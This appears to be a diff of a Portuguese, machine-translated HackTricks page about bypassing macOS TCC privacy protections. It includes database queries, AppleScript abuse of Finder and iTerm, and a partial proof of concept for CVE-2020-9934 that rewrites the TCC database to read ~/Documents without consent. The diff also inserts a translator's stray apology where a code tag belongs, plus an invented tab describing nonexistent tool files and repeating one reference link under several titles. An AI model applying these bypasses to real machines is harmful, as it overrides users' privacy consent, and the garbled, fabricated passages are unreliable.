@@ -1,22 +1,8 @@
-# macOS TCC
-
-<details>
-
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
-
-* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
-
-</details>
-
 ## **Informações Básicas**
 
-**TCC (Transparência, Consentimento e Controle)** é um mecanismo no macOS para **limitar e controlar o acesso de aplicativos a determinados recursos**, geralmente do ponto de vista da privacidade. Isso pode incluir coisas como serviços de localização, contatos, fotos, microfone, câmera, acessibilidade, acesso total ao disco e muito mais.
+O **TCC (Transparência, Consentimento e Controle)** é um mecanismo no macOS para **limitar e controlar o acesso do aplicativo a determinados recursos**, geralmente do ponto de vista da privacidade. Isso pode incluir coisas como serviços de localização, contatos, fotos, microfone, câmera, acessibilidade, acesso total ao disco e muito mais.
 
-Do ponto de vista do usuário, o TCC entra em ação **quando um aplicativo deseja acessar um dos recursos protegidos pelo TCC**. Quando isso acontece, o **usuário é solicitado** com uma caixa de diálogo perguntando se deseja permitir o acesso ou não.
+Do ponto de vista do usuário, eles veem o TCC em ação **quando um aplicativo deseja acessar um dos recursos protegidos pelo TCC**. Quando isso acontece, o **usuário é solicitado** com uma caixa de diálogo perguntando se eles desejam permitir o acesso ou não.
 
 Também é possível **conceder acesso a aplicativos** a arquivos por **intenções explícitas** dos usuários, por exemplo, quando um usuário **arrasta e solta um arquivo em um programa** (obviamente, o programa deve ter acesso a ele).
 
@@ -33,7 +19,7 @@ As permissões são **herdadas do aplicativo pai** e as **permissões** são **r
 As seleções são então armazenadas no banco de dados do sistema TCC em **`/Library/Application Support/com.apple.TCC/TCC.db`** ou em **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** para preferências por usuário. O banco de dados é **protegido contra edição com SIP** (Proteção de Integridade do Sistema), mas você pode lê-los concedendo **acesso total ao disco**.
 
 {% hint style="info" %}
-A **interface do centro de notificações** pode fazer **alterações no banco de dados do TCC do sistema**:
+A **interface do centro de notificação** pode fazer **alterações no banco de dados do TCC do sistema**:
 
 {% code overflow="wrap" %}
 ```bash
@@ -42,9 +28,7 @@ codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/S
 com.apple.private.tcc.manager
 com.apple.rootless.storage.TCC
 ```
-{% endcode %}
-
-No entanto, os usuários podem **excluir ou consultar regras** com a utilidade de linha de comando **`tccutil`**.
+No entanto, os usuários podem **excluir ou consultar regras** com o utilitário de linha de comando **`tccutil`**. 
 {% endhint %}
 
 {% tabs %}
@@ -67,17 +51,27 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 ```
 {% endtab %}
 
-Você pode encontrar a lista completa de aplicativos que possuem permissões TCC no banco de dados do sistema. Para acessar o banco de dados, execute o seguinte comando:
+{% tab title="macOS TCC" %}
+# Proteções de segurança do macOS: Controle de Acesso ao TCC
 
-```bash
-sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
-```
+O Controle de Acesso ao TCC (TCC, na sigla em inglês) é um recurso de segurança do macOS que controla o acesso de aplicativos a recursos protegidos, como a câmera, o microfone, a localização e os contatos. O TCC é implementado pelo daemon `tccd` e é gerenciado pelo `System Preferences`.
 
-Em seguida, você pode executar a seguinte consulta SQL para obter a lista de aplicativos e suas permissões:
+O TCC é uma parte importante do modelo de segurança do macOS, pois ajuda a proteger a privacidade do usuário e a impedir que aplicativos mal-intencionados acessem informações confidenciais. No entanto, o TCC não é perfeito e pode ser contornado por aplicativos mal-intencionados que exploram vulnerabilidades no sistema ou usam técnicas de engenharia social para enganar o usuário.
 
-```sql
-SELECT service, client, allowed FROM access;
-```
+Este diretório contém informações e ferramentas relacionadas ao TCC, incluindo:
+
+- **tccutil.py**: uma ferramenta Python para gerenciar as permissões do TCC.
+- **tcc.db**: um arquivo SQLite que contém as permissões do TCC.
+- **tcc_profiles.md**: uma lista de perfis do TCC e suas permissões padrão.
+- **tcc_vulnerabilities.md**: uma lista de vulnerabilidades conhecidas do TCC e como explorá-las.
+
+## Referências
+
+- [Controle de Acesso ao TCC](https://developer.apple.com/documentation/security/tcc)
+- [Gerenciando o acesso do usuário a localizações e recursos com o Controle de Acesso ao TCC](https://developer.apple.com/documentation/security/tcc)
+- [Explorando o Controle de Acesso ao TCC no macOS](https://objective-see.com/blog/blog_0x4D.html)
+- [Explorando o Controle de Acesso ao TCC no macOS Mojave](https://objective-see.com/blog/blog_0x4F.html)
+- [Explorando o Controle de Acesso ao TCC no macOS Catalina](https://objective-see.com/blog/blog_0x53.html)
 ```bash
 sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
 sqlite> .schema
@@ -133,7 +127,7 @@ csreq -t -r /tmp/telegram_csreq.bin
 Os aplicativos **não apenas precisam** solicitar e ter sido **concedido acesso** a alguns recursos, eles também precisam **ter as permissões relevantes**.\
 Por exemplo, o **Telegram** tem a permissão `com.apple.security.device.camera` para solicitar **acesso à câmera**. Um **aplicativo** que **não tenha** essa **permissão não poderá** acessar a câmera (e o usuário nem mesmo será solicitado a conceder as permissões).
 
-No entanto, para que os aplicativos tenham **acesso a determinadas pastas do usuário**, como `~/Desktop`, `~/Downloads` e `~/Documents`, eles **não precisam** ter nenhuma **permissão específica**. O sistema lidará com o acesso de forma transparente e **solicitará permissão ao usuário** conforme necessário.
+No entanto, para que os aplicativos tenham **acesso** a **certas pastas do usuário**, como `~/Desktop`, `~/Downloads` e `~/Documents`, eles **não precisam** ter nenhuma **permissão específica**. O sistema lidará com o acesso de forma transparente e **solicitará permissão ao usuário** conforme necessário.
 
 Os aplicativos da Apple **não gerarão prompts**. Eles contêm **direitos pré-concedidos** em sua lista de **permissões**, o que significa que eles **nunca gerarão um pop-up**, **nem** aparecerão em nenhum dos **bancos de dados do TCC**. Por exemplo:
 ```bash
@@ -146,7 +140,7 @@ codesign -dv --entitlements :- /System/Applications/Calendar.app
     <string>kTCCServiceAddressBook</string>
 </array>
 ```
-Isso evitará que o Calendário solicite ao usuário acesso a lembretes, calendário e lista de endereços.
+Isso evitará que o Calendário solicite ao usuário acesso a lembretes, calendário e lista de contatos.
 
 ### Locais sensíveis desprotegidos
 
@@ -191,15 +185,15 @@ ls: Desktop: Operation not permitted
 username@hostname ~ % cat Desktop/lalala
 asd
 ```
-O atributo estendido `com.apple.macl` é adicionado ao novo arquivo para dar acesso ao aplicativo criador para lê-lo.
+O **atributo estendido `com.apple.macl`** é adicionado ao novo **arquivo** para dar acesso ao aplicativo criador para lê-lo.
 
 ### Bypass SSH
 
-Por padrão, o acesso via SSH terá "Acesso total ao disco". Para desativar isso, você precisa tê-lo listado, mas desativado (removê-lo da lista não removerá esses privilégios):
+Por padrão, o acesso via **SSH** terá **"Acesso total ao disco"**. Para desativar isso, você precisa tê-lo listado, mas desativado (removê-lo da lista não removerá esses privilégios):
 
 ![](<../../../../.gitbook/assets/image (569).png>)
 
-Aqui você pode encontrar exemplos de como alguns malwares conseguiram contornar essa proteção:
+Aqui você pode encontrar exemplos de como alguns **malwares conseguiram burlar essa proteção**:
 
 * [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
 
@@ -211,7 +205,7 @@ O Electron está trabalhando na chave **`ElectronAsarIntegrity`** em Info.plist 
 
 ### Scripts do Terminal
 
-É bastante comum dar acesso total ao disco (FDA) ao terminal, pelo menos em computadores usados por pessoas de tecnologia. E é possível invocar scripts **`.terminal`** usando-o.
+É comum dar ao terminal **Acesso total ao disco (FDA)**, pelo menos em computadores usados por pessoas de tecnologia. E é possível invocar scripts **`.terminal`** usando-o.
 
 Os scripts **`.terminal`** são arquivos plist como este com o comando a ser executado na chave **`CommandString`**:
 ```xml
@@ -272,13 +266,13 @@ tell application "iTerm"
     end tell
 end tell
 ```
-{% endcode %} (This tag should not be translated)
+Desculpe, não há nenhum bloco de código aberto. Por favor, forneça o conteúdo que deseja traduzir.
 ```bash
 osascript iterm.script
 ```
 #### Sobre o Finder
 
-Ou se um aplicativo tem acesso sobre o Finder, ele pode executar um script como este:
+Ou se um aplicativo tem acesso sobre o Finder, ele pode ter um script como este:
 ```applescript
 set a_user to do shell script "logname"
 tell application "Finder"
@@ -333,10 +327,10 @@ __attribute__((constructor)) static void constructor(int argc, const char **argv
 ```
 ### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>
 
-O daemon **tccd** do usuário está usando a variável de ambiente **`HOME`** para acessar o banco de dados de usuários do TCC em: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
+O daemon **tccd** do usuário estava usando a variável de ambiente **`HOME`** para acessar o banco de dados de usuários do TCC em: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
 
 De acordo com [esta postagem do Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) e porque o daemon TCC está sendo executado via `launchd` dentro do domínio do usuário atual, é possível **controlar todas as variáveis de ambiente** passadas para ele.\
-Assim, um **atacante poderia definir a variável de ambiente `$HOME`** em **`launchctl`** para apontar para um **diretório controlado**, **reiniciar** o **daemon TCC** e, em seguida, **modificar diretamente o banco de dados do TCC** para dar a si mesmo **todas as permissões do TCC disponíveis** sem nunca solicitar ao usuário final.\
+Assim, um **atacante poderia definir a variável de ambiente `$HOME`** em **`launchctl`** para apontar para um **diretório controlado**, **reiniciar** o **daemon TCC**, e então **modificar diretamente o banco de dados do TCC** para dar a si mesmo **todas as permissões do TCC disponíveis** sem nunca solicitar ao usuário final.\
 PoC:
 ```bash
 # reset database just in case (no cheating!)
@@ -364,6 +358,12 @@ X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d69
 # list Documents directory without prompting the end user
 $> ls ~/Documents
 ```
+### CVE-2021-30761
+
+As notas tinham acesso a locais protegidos pelo TCC, mas quando uma nota é criada, ela é **criada em um local não protegido**. Portanto, é possível pedir para as notas copiarem um arquivo protegido em uma nota (ou seja, em um local não protegido) e, em seguida, acessar o arquivo:
+
+<figure><img src="../../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
 ### CVE-2023-26818 - Telegram
 
 O Telegram tinha as permissões `com.apple.security.cs.allow-dyld-environment-variables` e `com.apple.security.cs.disable-library-validation`, então era possível abusar dele para **obter acesso às suas permissões**, como gravar com a câmera. Você pode [**encontrar o payload no writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
@@ -374,13 +374,14 @@ O Telegram tinha as permissões `com.apple.security.cs.allow-dyld-environment-va
 * [**https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
 * [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
 * [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
+* [**https://www.youtube.com/watch?v=W9GxnP8c8FU**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
 * Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
